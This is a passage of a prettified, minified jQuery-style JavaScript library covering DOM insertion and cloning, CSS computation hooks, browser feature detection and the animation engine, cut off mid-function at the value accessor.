              ((s = f.clone(s, !0, !0)), a && f.merge(l, nt(s, "script"))),
            n.call(t[h], s, h);
        if (a)
          for (
            c = l[l.length - 1].ownerDocument, f.map(l, kt), h = 0;
            a > h;
            h++
          )
            (s = l[h]),
              G.test(s.type || "") &&
                !f._data(s, "globalEval") &&
                f.contains(c, s) &&
                (s.src
                  ? f._evalUrl && f._evalUrl(s.src)
                  : f.globalEval(
                      (s.text || s.textContent || s.innerHTML || "").replace(
                        Et,
                        ""
                      )
                    ));
        u = o = null;
      }
      return t;
    }
    function Nt(t, e, n) {
      for (var i, o = e ? f.filter(e, t) : t, r = 0; null != (i = o[r]); r++)
        n || 1 !== i.nodeType || f.cleanData(nt(i)),
          i.parentNode &&
            (n && f.contains(i.ownerDocument, i) && it(nt(i, "script")),
            i.parentNode.removeChild(i));
      return t;
    }
    f.extend({
      htmlPrefilter: function (t) {
        return t.replace(bt, "<$1></$2>");
      },
      clone: function (t, e, n) {
        var i,
          o,
          r,
          s,
          a,
          l = f.contains(t.ownerDocument, t);
        if (
          (d.html5Clone || f.isXMLDoc(t) || !yt.test("<" + t.nodeName + ">")
            ? (r = t.cloneNode(!0))
            : ((Tt.innerHTML = t.outerHTML),
              Tt.removeChild((r = Tt.firstChild))),
          !(
            (d.noCloneEvent && d.noCloneChecked) ||
            (1 !== t.nodeType && 11 !== t.nodeType) ||
            f.isXMLDoc(t)
          ))
        )
          for (i = nt(r), a = nt(t), s = 0; null != (o = a[s]); ++s)
            i[s] && Lt(o, i[s]);
        if (e)
          if (n)
            for (a = a || nt(t), i = i || nt(r), s = 0; null != (o = a[s]); s++)
              St(o, i[s]);
          else St(t, r);
        return (
          (i = nt(r, "script")).length > 0 && it(i, !l && nt(t, "script")),
          (i = a = o = null),
          r
        );
      },
      cleanData: function (t, e) {
        for (
          var i,
            o,
            r,
            s,
            a = 0,
            l = f.expando,
            c = f.cache,
            u = d.attributes,
            h = f.event.special;
          null != (i = t[a]);
          a++
        )
          if ((e || M(i)) && (s = (r = i[l]) && c[r])) {
            if (s.events)
              for (o in s.events)
                h[o] ? f.event.remove(i, o) : f.removeEvent(i, o, s.handle);
            c[r] &&
              (delete c[r],
              u || void 0 === i.removeAttribute
                ? (i[l] = void 0)
                : i.removeAttribute(l),
              n.push(r));
          }
      },
    }),
      f.fn.extend({
        domManip: Dt,
        detach: function (t) {
          return Nt(this, t, !0);
        },
        remove: function (t) {
          return Nt(this, t);
        },
        text: function (t) {
          return Y(
            this,
            function (t) {
              return void 0 === t
                ? f.text(this)
                : this.empty().append(
                    ((this[0] && this[0].ownerDocument) || i).createTextNode(t)
                  );
            },
            null,
            t,
            arguments.length
          );
        },
        append: function () {
          return Dt(this, arguments, function (t) {
            (1 !== this.nodeType &&
              11 !== this.nodeType &&
              9 !== this.nodeType) ||
              Ct(this, t).appendChild(t);
          });
        },
        prepend: function () {
          return Dt(this, arguments, function (t) {
            if (
              1 === this.nodeType ||
              11 === this.nodeType ||
              9 === this.nodeType
            ) {
              var e = Ct(this, t);
              e.insertBefore(t, e.firstChild);
            }
          });
        },
        before: function () {
          return Dt(this, arguments, function (t) {
            this.parentNode && this.parentNode.insertBefore(t, this);
          });
        },
        after: function () {
          return Dt(this, arguments, function (t) {
            this.parentNode &&
              this.parentNode.insertBefore(t, this.nextSibling);
          });
        },
        empty: function () {
          for (var t, e = 0; null != (t = this[e]); e++) {
            for (1 === t.nodeType && f.cleanData(nt(t, !1)); t.firstChild; )
              t.removeChild(t.firstChild);
            t.options && f.nodeName(t, "select") && (t.options.length = 0);
          }
          return this;
        },
        clone: function (t, e) {
          return (
            (t = null != t && t),
            (e = null == e ? t : e),
            this.map(function () {
              return f.clone(this, t, e);
            })
          );
        },
        html: function (t) {
          return Y(
            this,
            function (t) {
              var e = this[0] || {},
                n = 0,
                i = this.length;
              if (void 0 === t)
                return 1 === e.nodeType ? e.innerHTML.replace(vt, "") : void 0;
              if (
                "string" == typeof t &&
                !_t.test(t) &&
                (d.htmlSerialize || !yt.test(t)) &&
                (d.leadingWhitespace || !Z.test(t)) &&
                !et[(Q.exec(t) || ["", ""])[1].toLowerCase()]
              ) {
                t = f.htmlPrefilter(t);
                try {
                  for (; i > n; n++)
                    1 === (e = this[n] || {}).nodeType &&
                      (f.cleanData(nt(e, !1)), (e.innerHTML = t));
                  e = 0;
                } catch (t) {}
              }
              e && this.empty().append(t);
            },
            null,
            t,
            arguments.length
          );
        },
        replaceWith: function () {
          var t = [];
          return Dt(
            this,
            arguments,
            function (e) {
              var n = this.parentNode;
              f.inArray(this, t) < 0 &&
                (f.cleanData(nt(this)), n && n.replaceChild(e, this));
            },
            t
          );
        },
      }),
      f.each(
        {
          appendTo: "append",
          prependTo: "prepend",
          insertBefore: "before",
          insertAfter: "after",
          replaceAll: "replaceWith",
        },
        function (t, e) {
          f.fn[t] = function (t) {
            for (var n, i = 0, o = [], r = f(t), a = r.length - 1; a >= i; i++)
              (n = i === a ? this : this.clone(!0)),
                f(r[i])[e](n),
                s.apply(o, n.get());
            return this.pushStack(o);
          };
        }
      );
    var Ot,
      jt = { HTML: "block", BODY: "block" };
    function Pt(t, e) {
      var n = f(e.createElement(t)).appendTo(e.body),
        i = f.css(n[0], "display");
      return n.detach(), i;
    }
    function Ht(t) {
      var e = i,
        n = jt[t];
      return (
        n ||
          (("none" !== (n = Pt(t, e)) && n) ||
            ((e = (
              (Ot = (
                Ot || f("<iframe frameborder='0' width='0' height='0'/>")
              ).appendTo(e.documentElement))[0].contentWindow ||
              Ot[0].contentDocument
            ).document).write(),
            e.close(),
            (n = Pt(t, e)),
            Ot.detach()),
          (jt[t] = n)),
        n
      );
    }
    var Mt = /^margin/,
      zt = new RegExp("^(" + q + ")(?!px)[a-z%]+$", "i"),
      Bt = function (t, e, n, i) {
        var o,
          r,
          s = {};
        for (r in e) (s[r] = t.style[r]), (t.style[r] = e[r]);
        for (r in ((o = n.apply(t, i || [])), e)) t.style[r] = s[r];
        return o;
      },
      It = i.documentElement;
    !(function () {
      var e,
        n,
        o,
        r,
        s,
        a,
        l = i.createElement("div"),
        c = i.createElement("div");
      if (c.style) {
        function u() {
          var u,
            d,
            h = i.documentElement;
          h.appendChild(l),
            (c.style.cssText =
              "-webkit-box-sizing:border-box;box-sizing:border-box;position:relative;display:block;margin:auto;border:1px;padding:1px;top:1%;width:50%"),
            (e = o = a = !1),
            (n = s = !0),
            t.getComputedStyle &&
              ((d = t.getComputedStyle(c)),
              (e = "1%" !== (d || {}).top),
              (a = "2px" === (d || {}).marginLeft),
              (o = "4px" === (d || { width: "4px" }).width),
              (c.style.marginRight = "50%"),
              (n = "4px" === (d || { marginRight: "4px" }).marginRight),
              ((u = c.appendChild(i.createElement("div"))).style.cssText =
                c.style.cssText =
                  "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0"),
              (u.style.marginRight = u.style.width = "0"),
              (c.style.width = "1px"),
              (s = !parseFloat((t.getComputedStyle(u) || {}).marginRight)),
              c.removeChild(u)),
            (c.style.display = "none"),
            (r = 0 === c.getClientRects().length) &&
              ((c.style.display = ""),
              (c.innerHTML = "<table><tr><td></td><td>t</td></tr></table>"),
              (c.childNodes[0].style.borderCollapse = "separate"),
              ((u = c.getElementsByTagName("td"))[0].style.cssText =
                "margin:0;border:0;padding:0;display:none"),
              (r = 0 === u[0].offsetHeight) &&
                ((u[0].style.display = ""),
                (u[1].style.display = "none"),
                (r = 0 === u[0].offsetHeight))),
            h.removeChild(l);
        }
        (c.style.cssText = "float:left;opacity:.5"),
          (d.opacity = "0.5" === c.style.opacity),
          (d.cssFloat = !!c.style.cssFloat),
          (c.style.backgroundClip = "content-box"),
          (c.cloneNode(!0).style.backgroundClip = ""),
          (d.clearCloneStyle = "content-box" === c.style.backgroundClip),
          ((l = i.createElement("div")).style.cssText =
            "border:0;width:8px;height:0;top:0;left:-9999px;padding:0;margin-top:1px;position:absolute"),
          (c.innerHTML = ""),
          l.appendChild(c),
          (d.boxSizing =
            "" === c.style.boxSizing ||
            "" === c.style.MozBoxSizing ||
            "" === c.style.WebkitBoxSizing),
          f.extend(d, {
            reliableHiddenOffsets: function () {
              return null == e && u(), r;
            },
            boxSizingReliable: function () {
              return null == e && u(), o;
            },
            pixelMarginRight: function () {
              return null == e && u(), n;
            },
            pixelPosition: function () {
              return null == e && u(), e;
            },
            reliableMarginRight: function () {
              return null == e && u(), s;
            },
            reliableMarginLeft: function () {
              return null == e && u(), a;
            },
          });
      }
    })();
    var $t,
      Rt,
      Wt = /^(top|right|bottom|left)$/;
    function qt(t, e) {
      return {
        get: function () {
          return t()
            ? void delete this.get
            : (this.get = e).apply(this, arguments);
        },
      };
    }
    t.getComputedStyle
      ? (($t = function (e) {
          var n = e.ownerDocument.defaultView;
          return (n && n.opener) || (n = t), n.getComputedStyle(e);
        }),
        (Rt = function (t, e, n) {
          var i,
            o,
            r,
            s,
            a = t.style;
          return (
            ("" !==
              (s = (n = n || $t(t)) ? n.getPropertyValue(e) || n[e] : void 0) &&
              void 0 !== s) ||
              f.contains(t.ownerDocument, t) ||
              (s = f.style(t, e)),
            n &&
              !d.pixelMarginRight() &&
              zt.test(s) &&
              Mt.test(e) &&
              ((i = a.width),
              (o = a.minWidth),
              (r = a.maxWidth),
              (a.minWidth = a.maxWidth = a.width = s),
              (s = n.width),
              (a.width = i),
              (a.minWidth = o),
              (a.maxWidth = r)),
            void 0 === s ? s : s + ""
          );
        }))
      : It.currentStyle &&
        (($t = function (t) {
          return t.currentStyle;
        }),
        (Rt = function (t, e, n) {
          var i,
            o,
            r,
            s,
            a = t.style;
          return (
            null == (s = (n = n || $t(t)) ? n[e] : void 0) &&
              a &&
              a[e] &&
              (s = a[e]),
            zt.test(s) &&
              !Wt.test(e) &&
              ((i = a.left),
              (r = (o = t.runtimeStyle) && o.left) &&
                (o.left = t.currentStyle.left),
              (a.left = "fontSize" === e ? "1em" : s),
              (s = a.pixelLeft + "px"),
              (a.left = i),
              r && (o.left = r)),
            void 0 === s ? s : s + "" || "auto"
          );
        }));
    var Ft = /alpha\([^)]*\)/i,
      Ut = /opacity\s*=\s*([^)]*)/i,
      Xt = /^(none|table(?!-c[ea]).+)/,
      Vt = new RegExp("^(" + q + ")(.*)$", "i"),
      Yt = { position: "absolute", visibility: "hidden", display: "block" },
      Kt = { letterSpacing: "0", fontWeight: "400" },
      Qt = ["Webkit", "O", "Moz", "ms"],
      Gt = i.createElement("div").style;
    function Zt(t) {
      if (t in Gt) return t;
      for (var e = t.charAt(0).toUpperCase() + t.slice(1), n = Qt.length; n--; )
        if ((t = Qt[n] + e) in Gt) return t;
    }
    function Jt(t, e) {
      for (var n, i, o, r = [], s = 0, a = t.length; a > s; s++)
        (i = t[s]).style &&
          ((r[s] = f._data(i, "olddisplay")),
          (n = i.style.display),
          e
            ? (r[s] || "none" !== n || (i.style.display = ""),
              "" === i.style.display &&
                X(i) &&
                (r[s] = f._data(i, "olddisplay", Ht(i.nodeName))))
            : ((o = X(i)),
              ((n && "none" !== n) || !o) &&
                f._data(i, "olddisplay", o ? n : f.css(i, "display"))));
      for (s = 0; a > s; s++)
        (i = t[s]).style &&
          ((e && "none" !== i.style.display && "" !== i.style.display) ||
            (i.style.display = e ? r[s] || "" : "none"));
      return t;
    }
    function te(t, e, n) {
      var i = Vt.exec(e);
      return i ? Math.max(0, i[1] - (n || 0)) + (i[2] || "px") : e;
    }
    function ee(t, e, n, i, o) {
      for (
        var r = n === (i ? "border" : "content") ? 4 : "width" === e ? 1 : 0,
          s = 0;
        4 > r;
        r += 2
      )
        "margin" === n && (s += f.css(t, n + U[r], !0, o)),
          i
            ? ("content" === n && (s -= f.css(t, "padding" + U[r], !0, o)),
              "margin" !== n &&
                (s -= f.css(t, "border" + U[r] + "Width", !0, o)))
            : ((s += f.css(t, "padding" + U[r], !0, o)),
              "padding" !== n &&
                (s += f.css(t, "border" + U[r] + "Width", !0, o)));
      return s;
    }
    function ne(t, e, n) {
      var i = !0,
        o = "width" === e ? t.offsetWidth : t.offsetHeight,
        r = $t(t),
        s = d.boxSizing && "border-box" === f.css(t, "boxSizing", !1, r);
      if (0 >= o || null == o) {
        if (
          ((0 > (o = Rt(t, e, r)) || null == o) && (o = t.style[e]), zt.test(o))
        )
          return o;
        (i = s && (d.boxSizingReliable() || o === t.style[e])),
          (o = parseFloat(o) || 0);
      }
      return o + ee(t, e, n || (s ? "border" : "content"), i, r) + "px";
    }
    function ie(t, e, n, i, o) {
      return new ie.prototype.init(t, e, n, i, o);
    }
    f.extend({
      cssHooks: {
        opacity: {
          get: function (t, e) {
            if (e) {
              var n = Rt(t, "opacity");
              return "" === n ? "1" : n;
            }
          },
        },
      },
      cssNumber: {
        animationIterationCount: !0,
        columnCount: !0,
        fillOpacity: !0,
        flexGrow: !0,
        flexShrink: !0,
        fontWeight: !0,
        lineHeight: !0,
        opacity: !0,
        order: !0,
        orphans: !0,
        widows: !0,
        zIndex: !0,
        zoom: !0,
      },
      cssProps: { float: d.cssFloat ? "cssFloat" : "styleFloat" },
      style: function (t, e, n, i) {
        if (t && 3 !== t.nodeType && 8 !== t.nodeType && t.style) {
          var o,
            r,
            s,
            a = f.camelCase(e),
            l = t.style;
          if (
            ((e = f.cssProps[a] || (f.cssProps[a] = Zt(a) || a)),
            (s = f.cssHooks[e] || f.cssHooks[a]),
            void 0 === n)
          )
            return s && "get" in s && void 0 !== (o = s.get(t, !1, i))
              ? o
              : l[e];
          if (
            ("string" === (r = typeof n) &&
              (o = F.exec(n)) &&
              o[1] &&
              ((n = V(t, e, o)), (r = "number")),
            null != n &&
              n == n &&
              ("number" === r &&
                (n += (o && o[3]) || (f.cssNumber[a] ? "" : "px")),
              d.clearCloneStyle ||
                "" !== n ||
                0 !== e.indexOf("background") ||
                (l[e] = "inherit"),
              !s || !("set" in s) || void 0 !== (n = s.set(t, n, i))))
          )
            try {
              l[e] = n;
            } catch (t) {}
        }
      },
      css: function (t, e, n, i) {
        var o,
          r,
          s,
          a = f.camelCase(e);
        return (
          (e = f.cssProps[a] || (f.cssProps[a] = Zt(a) || a)),
          (s = f.cssHooks[e] || f.cssHooks[a]) &&
            "get" in s &&
            (r = s.get(t, !0, n)),
          void 0 === r && (r = Rt(t, e, i)),
          "normal" === r && e in Kt && (r = Kt[e]),
          "" === n || n
            ? ((o = parseFloat(r)), !0 === n || isFinite(o) ? o || 0 : r)
            : r
        );
      },
    }),
      f.each(["height", "width"], function (t, e) {
        f.cssHooks[e] = {
          get: function (t, n, i) {
            return n
              ? Xt.test(f.css(t, "display")) && 0 === t.offsetWidth
                ? Bt(t, Yt, function () {
                    return ne(t, e, i);
                  })
                : ne(t, e, i)
              : void 0;
          },
          set: function (t, n, i) {
            var o = i && $t(t);
            return te(
              0,
              n,
              i
                ? ee(
                    t,
                    e,
                    i,
                    d.boxSizing &&
                      "border-box" === f.css(t, "boxSizing", !1, o),
                    o
                  )
                : 0
            );
          },
        };
      }),
      d.opacity ||
        (f.cssHooks.opacity = {
          get: function (t, e) {
            return Ut.test(
              (e && t.currentStyle ? t.currentStyle.filter : t.style.filter) ||
                ""
            )
              ? 0.01 * parseFloat(RegExp.$1) + ""
              : e
              ? "1"
              : "";
          },
          set: function (t, e) {
            var n = t.style,
              i = t.currentStyle,
              o = f.isNumeric(e) ? "alpha(opacity=" + 100 * e + ")" : "",
              r = (i && i.filter) || n.filter || "";
            (n.zoom = 1),
              ((e >= 1 || "" === e) &&
                "" === f.trim(r.replace(Ft, "")) &&
                n.removeAttribute &&
                (n.removeAttribute("filter"), "" === e || (i && !i.filter))) ||
                (n.filter = Ft.test(r) ? r.replace(Ft, o) : r + " " + o);
          },
        }),
      (f.cssHooks.marginRight = qt(d.reliableMarginRight, function (t, e) {
        return e
          ? Bt(t, { display: "inline-block" }, Rt, [t, "marginRight"])
          : void 0;
      })),
      (f.cssHooks.marginLeft = qt(d.reliableMarginLeft, function (t, e) {
        return e
          ? (parseFloat(Rt(t, "marginLeft")) ||
              (f.contains(t.ownerDocument, t)
                ? t.getBoundingClientRect().left -
                  Bt(t, { marginLeft: 0 }, function () {
                    return t.getBoundingClientRect().left;
                  })
                : 0)) + "px"
          : void 0;
      })),
      f.each({ margin: "", padding: "", border: "Width" }, function (t, e) {
        (f.cssHooks[t + e] = {
          expand: function (n) {
            for (
              var i = 0, o = {}, r = "string" == typeof n ? n.split(" ") : [n];
              4 > i;
              i++
            )
              o[t + U[i] + e] = r[i] || r[i - 2] || r[0];
            return o;
          },
        }),
          Mt.test(t) || (f.cssHooks[t + e].set = te);
      }),
      f.fn.extend({
        css: function (t, e) {
          return Y(
            this,
            function (t, e, n) {
              var i,
                o,
                r = {},
                s = 0;
              if (f.isArray(e)) {
                for (i = $t(t), o = e.length; o > s; s++)
                  r[e[s]] = f.css(t, e[s], !1, i);
                return r;
              }
              return void 0 !== n ? f.style(t, e, n) : f.css(t, e);
            },
            t,
            e,
            arguments.length > 1
          );
        },
        show: function () {
          return Jt(this, !0);
        },
        hide: function () {
          return Jt(this);
        },
        toggle: function (t) {
          return "boolean" == typeof t
            ? t
              ? this.show()
              : this.hide()
            : this.each(function () {
                X(this) ? f(this).show() : f(this).hide();
              });
        },
      }),
      (f.Tween = ie),
      (ie.prototype = {
        constructor: ie,
        init: function (t, e, n, i, o, r) {
          (this.elem = t),
            (this.prop = n),
            (this.easing = o || f.easing._default),
            (this.options = e),
            (this.start = this.now = this.cur()),
            (this.end = i),
            (this.unit = r || (f.cssNumber[n] ? "" : "px"));
        },
        cur: function () {
          var t = ie.propHooks[this.prop];
          return t && t.get ? t.get(this) : ie.propHooks._default.get(this);
        },
        run: function (t) {
          var e,
            n = ie.propHooks[this.prop];
          return (
            this.options.duration
              ? (this.pos = e =
                  f.easing[this.easing](
                    t,
                    this.options.duration * t,
                    0,
                    1,
                    this.options.duration
                  ))
              : (this.pos = e = t),
            (this.now = (this.end - this.start) * e + this.start),
            this.options.step &&
              this.options.step.call(this.elem, this.now, this),
            n && n.set ? n.set(this) : ie.propHooks._default.set(this),
            this
          );
        },
      }),
      (ie.prototype.init.prototype = ie.prototype),
      (ie.propHooks = {
        _default: {
          get: function (t) {
            var e;
            return 1 !== t.elem.nodeType ||
              (null != t.elem[t.prop] && null == t.elem.style[t.prop])
              ? t.elem[t.prop]
              : (e = f.css(t.elem, t.prop, "")) && "auto" !== e
              ? e
              : 0;
          },
          set: function (t) {
            f.fx.step[t.prop]
              ? f.fx.step[t.prop](t)
              : 1 !== t.elem.nodeType ||
                (null == t.elem.style[f.cssProps[t.prop]] &&
                  !f.cssHooks[t.prop])
              ? (t.elem[t.prop] = t.now)
              : f.style(t.elem, t.prop, t.now + t.unit);
          },
        },
      }),
      (ie.propHooks.scrollTop = ie.propHooks.scrollLeft =
        {
          set: function (t) {
            t.elem.nodeType && t.elem.parentNode && (t.elem[t.prop] = t.now);
          },
        }),
      (f.easing = {
        linear: function (t) {
          return t;
        },
        swing: function (t) {
          return 0.5 - Math.cos(t * Math.PI) / 2;
        },
        _default: "swing",
      }),
      (f.fx = ie.prototype.init),
      (f.fx.step = {});
    var oe,
      re,
      se = /^(?:toggle|show|hide)$/,
      ae = /queueHooks$/;
    function le() {
      return (
        t.setTimeout(function () {
          oe = void 0;
        }),
        (oe = f.now())
      );
    }
    function ce(t, e) {
      var n,
        i = { height: t },
        o = 0;
      for (e = e ? 1 : 0; 4 > o; o += 2 - e)
        i["margin" + (n = U[o])] = i["padding" + n] = t;
      return e && (i.opacity = i.width = t), i;
    }
    function ue(t, e, n) {
      for (
        var i,
          o = (de.tweeners[e] || []).concat(de.tweeners["*"]),
          r = 0,
          s = o.length;
        s > r;
        r++
      )
        if ((i = o[r].call(n, e, t))) return i;
    }
    function de(t, e, n) {
      var i,
        o,
        r = 0,
        s = de.prefilters.length,
        a = f.Deferred().always(function () {
          delete l.elem;
        }),
        l = function () {
          if (o) return !1;
          for (
            var e = oe || le(),
              n = Math.max(0, c.startTime + c.duration - e),
              i = 1 - (n / c.duration || 0),
              r = 0,
              s = c.tweens.length;
            s > r;
            r++
          )
            c.tweens[r].run(i);
          return (
            a.notifyWith(t, [c, i, n]),
            1 > i && s ? n : (a.resolveWith(t, [c]), !1)
          );
        },
        c = a.promise({
          elem: t,
          props: f.extend({}, e),
          opts: f.extend(
            !0,
            { specialEasing: {}, easing: f.easing._default },
            n
          ),
          originalProperties: e,
          originalOptions: n,
          startTime: oe || le(),
          duration: n.duration,
          tweens: [],
          createTween: function (e, n) {
            var i = f.Tween(
              t,
              c.opts,
              e,
              n,
              c.opts.specialEasing[e] || c.opts.easing
            );
            return c.tweens.push(i), i;
          },
          stop: function (e) {
            var n = 0,
              i = e ? c.tweens.length : 0;
            if (o) return this;
            for (o = !0; i > n; n++) c.tweens[n].run(1);
            return (
              e
                ? (a.notifyWith(t, [c, 1, 0]), a.resolveWith(t, [c, e]))
                : a.rejectWith(t, [c, e]),
              this
            );
          },
        }),
        u = c.props;
      for (
        (function (t, e) {
          var n, i, o, r, s;
          for (n in t)
            if (
              ((o = e[(i = f.camelCase(n))]),
              (r = t[n]),
              f.isArray(r) && ((o = r[1]), (r = t[n] = r[0])),
              n !== i && ((t[i] = r), delete t[n]),
              (s = f.cssHooks[i]) && ("expand" in s))
            )
              for (n in ((r = s.expand(r)), delete t[i], r))
                (n in t) || ((t[n] = r[n]), (e[n] = o));
            else e[i] = o;
        })(u, c.opts.specialEasing);
        s > r;
        r++
      )
        if ((i = de.prefilters[r].call(c, t, u, c.opts)))
          return (
            f.isFunction(i.stop) &&
              (f._queueHooks(c.elem, c.opts.queue).stop = f.proxy(i.stop, i)),
            i
          );
      return (
        f.map(u, ue, c),
        f.isFunction(c.opts.start) && c.opts.start.call(t, c),
        f.fx.timer(f.extend(l, { elem: t, anim: c, queue: c.opts.queue })),
        c
          .progress(c.opts.progress)
          .done(c.opts.done, c.opts.complete)
          .fail(c.opts.fail)
          .always(c.opts.always)
      );
    }
    (f.Animation = f.extend(de, {
      tweeners: {
        "*": [
          function (t, e) {
            var n = this.createTween(t, e);
            return V(n.elem, t, F.exec(e), n), n;
          },
        ],
      },
      tweener: function (t, e) {
        f.isFunction(t) ? ((e = t), (t = ["*"])) : (t = t.match(j));
        for (var n, i = 0, o = t.length; o > i; i++)
          (n = t[i]),
            (de.tweeners[n] = de.tweeners[n] || []),
            de.tweeners[n].unshift(e);
      },
      prefilters: [
        function (t, e, n) {
          var i,
            o,
            r,
            s,
            a,
            l,
            c,
            u = this,
            h = {},
            p = t.style,
            g = t.nodeType && X(t),
            m = f._data(t, "fxshow");
          for (i in (n.queue ||
            (null == (a = f._queueHooks(t, "fx")).unqueued &&
              ((a.unqueued = 0),
              (l = a.empty.fire),
              (a.empty.fire = function () {
                a.unqueued || l();
              })),
            a.unqueued++,
            u.always(function () {
              u.always(function () {
                a.unqueued--, f.queue(t, "fx").length || a.empty.fire();
              });
            })),
          1 === t.nodeType &&
            ("height" in e || "width" in e) &&
            ((n.overflow = [p.overflow, p.overflowX, p.overflowY]),
            "inline" ===
              ("none" === (c = f.css(t, "display"))
                ? f._data(t, "olddisplay") || Ht(t.nodeName)
                : c) &&
              "none" === f.css(t, "float") &&
              (d.inlineBlockNeedsLayout && "inline" !== Ht(t.nodeName)
                ? (p.zoom = 1)
                : (p.display = "inline-block"))),
          n.overflow &&
            ((p.overflow = "hidden"),
            d.shrinkWrapBlocks() ||
              u.always(function () {
                (p.overflow = n.overflow[0]),
                  (p.overflowX = n.overflow[1]),
                  (p.overflowY = n.overflow[2]);
              })),
          e))
            if (((o = e[i]), se.exec(o))) {
              if (
                (delete e[i],
                (r = r || "toggle" === o),
                o === (g ? "hide" : "show"))
              ) {
                if ("show" !== o || !m || void 0 === m[i]) continue;
                g = !0;
              }
              h[i] = (m && m[i]) || f.style(t, i);
            } else c = void 0;
          if (f.isEmptyObject(h))
            "inline" === ("none" === c ? Ht(t.nodeName) : c) && (p.display = c);
          else
            for (i in (m
              ? "hidden" in m && (g = m.hidden)
              : (m = f._data(t, "fxshow", {})),
            r && (m.hidden = !g),
            g
              ? f(t).show()
              : u.done(function () {
                  f(t).hide();
                }),
            u.done(function () {
              var e;
              for (e in (f._removeData(t, "fxshow"), h)) f.style(t, e, h[e]);
            }),
            h))
              (s = ue(g ? m[i] : 0, i, u)),
                i in m ||
                  ((m[i] = s.start),
                  g &&
                    ((s.end = s.start),
                    (s.start = "width" === i || "height" === i ? 1 : 0)));
        },
      ],
      prefilter: function (t, e) {
        e ? de.prefilters.unshift(t) : de.prefilters.push(t);
      },
    })),
      (f.speed = function (t, e, n) {
        var i =
          t && "object" == typeof t
            ? f.extend({}, t)
            : {
                complete: n || (!n && e) || (f.isFunction(t) && t),
                duration: t,
                easing: (n && e) || (e && !f.isFunction(e) && e),
              };
        return (
          (i.duration = f.fx.off
            ? 0
            : "number" == typeof i.duration
            ? i.duration
            : i.duration in f.fx.speeds
            ? f.fx.speeds[i.duration]
            : f.fx.speeds._default),
          (null != i.queue && !0 !== i.queue) || (i.queue = "fx"),
          (i.old = i.complete),
          (i.complete = function () {
            f.isFunction(i.old) && i.old.call(this),
              i.queue && f.dequeue(this, i.queue);
          }),
          i
        );
      }),
      f.fn.extend({
        fadeTo: function (t, e, n, i) {
          return this.filter(X)
            .css("opacity", 0)
            .show()
            .end()
            .animate({ opacity: e }, t, n, i);
        },
        animate: function (t, e, n, i) {
          var o = f.isEmptyObject(t),
            r = f.speed(e, n, i),
            s = function () {
              var e = de(this, f.extend({}, t), r);
              (o || f._data(this, "finish")) && e.stop(!0);
            };
          return (
            (s.finish = s),
            o || !1 === r.queue ? this.each(s) : this.queue(r.queue, s)
          );
        },
        stop: function (t, e, n) {
          var i = function (t) {
            var e = t.stop;
            delete t.stop, e(n);
          };
          return (
            "string" != typeof t && ((n = e), (e = t), (t = void 0)),
            e && !1 !== t && this.queue(t || "fx", []),
            this.each(function () {
              var e = !0,
                o = null != t && t + "queueHooks",
                r = f.timers,
                s = f._data(this);
              if (o) s[o] && s[o].stop && i(s[o]);
              else for (o in s) s[o] && s[o].stop && ae.test(o) && i(s[o]);
              for (o = r.length; o--; )
                r[o].elem !== this ||
                  (null != t && r[o].queue !== t) ||
                  (r[o].anim.stop(n), (e = !1), r.splice(o, 1));
              (!e && n) || f.dequeue(this, t);
            })
          );
        },
        finish: function (t) {
          return (
            !1 !== t && (t = t || "fx"),
            this.each(function () {
              var e,
                n = f._data(this),
                i = n[t + "queue"],
                o = n[t + "queueHooks"],
                r = f.timers,
                s = i ? i.length : 0;
              for (
                n.finish = !0,
                  f.queue(this, t, []),
                  o && o.stop && o.stop.call(this, !0),
                  e = r.length;
                e--;

              )
                r[e].elem === this &&
                  r[e].queue === t &&
                  (r[e].anim.stop(!0), r.splice(e, 1));
              for (e = 0; s > e; e++)
                i[e] && i[e].finish && i[e].finish.call(this);
              delete n.finish;
            })
          );
        },
      }),
      f.each(["toggle", "show", "hide"], function (t, e) {
        var n = f.fn[e];
        f.fn[e] = function (t, i, o) {
          return null == t || "boolean" == typeof t
            ? n.apply(this, arguments)
            : this.animate(ce(e, !0), t, i, o);
        };
      }),
      f.each(
        {
          slideDown: ce("show"),
          slideUp: ce("hide"),
          slideToggle: ce("toggle"),
          fadeIn: { opacity: "show" },
          fadeOut: { opacity: "hide" },
          fadeToggle: { opacity: "toggle" },
        },
        function (t, e) {
          f.fn[t] = function (t, n, i) {
            return this.animate(e, t, n, i);
          };
        }
      ),
      (f.timers = []),
      (f.fx.tick = function () {
        var t,
          e = f.timers,
          n = 0;
        for (oe = f.now(); n < e.length; n++)
          (t = e[n])() || e[n] !== t || e.splice(n--, 1);
        e.length || f.fx.stop(), (oe = void 0);
      }),
      (f.fx.timer = function (t) {
        f.timers.push(t), t() ? f.fx.start() : f.timers.pop();
      }),
      (f.fx.interval = 13),
      (f.fx.start = function () {
        re || (re = t.setInterval(f.fx.tick, f.fx.interval));
      }),
      (f.fx.stop = function () {
        t.clearInterval(re), (re = null);
      }),
      (f.fx.speeds = { slow: 600, fast: 200, _default: 400 }),
      (f.fn.delay = function (e, n) {
        return (
          (e = (f.fx && f.fx.speeds[e]) || e),
          (n = n || "fx"),
          this.queue(n, function (n, i) {
            var o = t.setTimeout(n, e);
            i.stop = function () {
              t.clearTimeout(o);
            };
          })
        );
      }),
      (function () {
        var t,
          e = i.createElement("input"),
          n = i.createElement("div"),
          o = i.createElement("select"),
          r = o.appendChild(i.createElement("option"));
        (n = i.createElement("div")).setAttribute("className", "t"),
          (n.innerHTML =
            "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>"),
          (t = n.getElementsByTagName("a")[0]),
          e.setAttribute("type", "checkbox"),
          n.appendChild(e),
          ((t = n.getElementsByTagName("a")[0]).style.cssText = "top:1px"),
          (d.getSetAttribute = "t" !== n.className),
          (d.style = /top/.test(t.getAttribute("style"))),
          (d.hrefNormalized = "/a" === t.getAttribute("href")),
          (d.checkOn = !!e.value),
          (d.optSelected = r.selected),
          (d.enctype = !!i.createElement("form").enctype),
          (o.disabled = !0),
          (d.optDisabled = !r.disabled),
          (e = i.createElement("input")).setAttribute("value", ""),
          (d.input = "" === e.getAttribute("value")),
          (e.value = "t"),
          e.setAttribute("type", "radio"),
          (d.radioValue = "t" === e.value);
      })();
    var he = /\r/g,
      fe = /[\x20\t\r\n\f]+/g;
    f.fn.extend({
      val: function (t) {
        var e,
          n,
          i,
          o = this[0];
        return arguments.length
          ? ((i = f.isFunction(t)),
            this.each(function (n) {
              var o;
              1 === this.nodeType &&
                (null == (o = i ? t.call(this, n, f(this).val()) : t)
                  ? (o = "")
                  : "number" == typeof o
